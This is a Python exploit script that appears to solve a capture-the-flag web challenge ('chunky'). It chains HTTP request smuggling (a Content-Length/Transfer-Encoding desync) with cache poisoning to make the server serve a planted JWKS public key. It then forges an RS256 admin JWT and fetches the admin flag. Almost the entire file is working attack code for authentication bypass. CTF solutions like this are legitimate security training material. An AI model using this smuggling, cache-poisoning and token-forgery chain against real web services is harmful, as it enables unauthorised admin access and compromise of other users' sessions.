import requests
import json
import sys
import jwt
from pwn import *

# Local
TARGET_HOST = 'localhost'
TARGET_PORT = 8080

# Remote
# http://chunky.chals.sekai.team:8080
TARGET_HOST = 'localhost'
# TARGET_HOST = 'chunky.chals.sekai.team'
TARGET_PORT = 8080

TARGET = f'http://{TARGET_HOST}:{TARGET_PORT}'

USERNAME = sys.argv[1]
PWD = 'nep1'

CRLF = '\r\n'
KEY_PREFIX = 'local_key3'

session = requests.Session()

def signup(user, pwd):
    headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'username': user,
        'password': pwd,
    }

    response = session.post(f'{TARGET}/signup', headers=headers, data=data, allow_redirects=False)
    return response.headers['Location']

def login(user, pwd):
    headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'username': user,
        'password': pwd,
    }

    response = session.post(f'{TARGET}/login', headers=headers, data=data, allow_redirects=False)
    return response.headers['Location']

def create_post(title, content):
    headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'title': title,
        'content': content
    }

    response = session.post(f'{TARGET}/create_post', headers=headers, data=data, allow_redirects=False)
    return response.headers['Location']

def gen_fake_jkws():
    pubkey = '\n'.join(open(f'{KEY_PREFIX}.pub').read().split('\n')[1:-1])

    return json.dumps({
        "keys": [
            {
                "alg": "RS256",
                "x5c": [
                    pubkey
                ]
            }
        ]
    })

def gen_token_local_key():
    privkey = open(f'{KEY_PREFIX}', 'rb').read()
    return jwt.encode({'user': 'admin'}, privkey, algorithm="RS256").decode('utf-8')

def attack_desync(user_id, post_id):

    # Prepare Desync Request 2 (Injected)
    desync2_lines = open('desync2.txt', 'r').readlines()
    desync2_lines = [x.replace('{{USER_ID}}', user_id) for x in desync2_lines]
    desync2_lines = [x.replace('{{POST_ID}}', post_id) for x in desync2_lines]
    desync2_lines = [x.replace('{{SESSION}}', session.cookies['session']) for x in desync2_lines]
    desync2_lines = [x.replace('\n', '\r\n') for x in desync2_lines]

    # Prepare Desync Request 3 (Poisoned)
    desync3_lines = open('desync3.txt', 'r').readlines()
    desync3_lines = [x.replace('{{USER_ID}}', user_id) for x in desync3_lines]
    desync3_lines = [x.replace('{{SESSION}}', session.cookies['session']) for x in desync3_lines]
    desync3_lines = [x.replace('\n', '\r\n') for x in desync3_lines]

    content_length = str(sum([len(x) for x in desync2_lines]))

    r = remote(TARGET_HOST, TARGET_PORT)

    desync1_lines = [x.replace('{{SESSION}}', session.cookies['session']) for x in open('desync1.txt', 'r').readlines()]
    desync1_lines = [x.replace('{{CONTENT-LENGTH}}', content_length) for x in desync1_lines]
    desync1_lines = [x.replace('Transfer-Encoding', 'transfer-encoding') for x in desync1_lines]
    desync1_lines = [x.replace('\n', '\r\n') for x in desync1_lines]
    for line in desync1_lines:
        r.send(line)

    # Inject request 2 as it was in 1
    for line in desync2_lines:
        r.send(line)

    # Parse HTTP Response 1
    response = ''
    received = r.recvuntil(CRLF).decode('utf-8')
    response += received
    response_length = 0
    while len(received) > 2:
        received = r.recvuntil(CRLF).decode('utf-8')
        if received.find('Content-Length') == 0:
            response_length = int(received.split(': ')[1])
        response += received

    result = r.recv(response_length)

    # HTTP 400
    print('===============> First Response (Expect Error 400)')
    print(result)
    print('===============> End of First Response')

    # Send request 3 as it was 2
    for line in desync3_lines:
        r.send(line)

    # Parse HTTP Response 2 (poisoning request 3)
    response = ''
    received = r.recvuntil(CRLF).decode('utf-8')
    response += received
    response_length = 0
    while len(received) > 2:
        response += received
        if received.find('Content-Length') == 0:
            response_length = int(received.split(': ')[1])
        received = r.recvuntil(CRLF).decode('utf-8')

    result = r.recv(response_length)

    # HTTP 400
    print('===============> Second Response (Expect Fake Key)')
    print(result)
    print('===============> End of Second Response')

# Gen Token before everything (avoid caching time outs)
jwt_token = gen_token_local_key()

print('===== SIGNUP')
print(signup(USERNAME, PWD))
print()

print('===== LOGIN')
print(login(USERNAME, PWD))
print()

print('===== POST')
post_url = create_post(gen_fake_jkws(), '')
_, _, user_id, post_id = post_url.split('/')
print(f'URL: {post_url}')
print(f'USER_ID: {user_id}')
print(f'POST_ID: {post_id}')
print()

# Poison cache
print('===== DESYNC!!')
attack_desync(user_id, post_id)
print('==========')
print()

# Test poisoned cache
print('===== Test Poisoned Cache!!')
cookies = {
    'session': session.cookies['session']
}

response = requests.get(f'{TARGET}/{user_id}/.well-known/jwks.json', cookies=cookies)
print(response.status_code)
print(response.text)
print('==========')
print()

# Get Flaaaag!
headers = {
    'Authorization': f'Bearer {jwt_token}'
}

response = requests.get(f'{TARGET}/admin/flag', headers=headers, cookies=cookies)
print(response.status_code)
print(response.text)
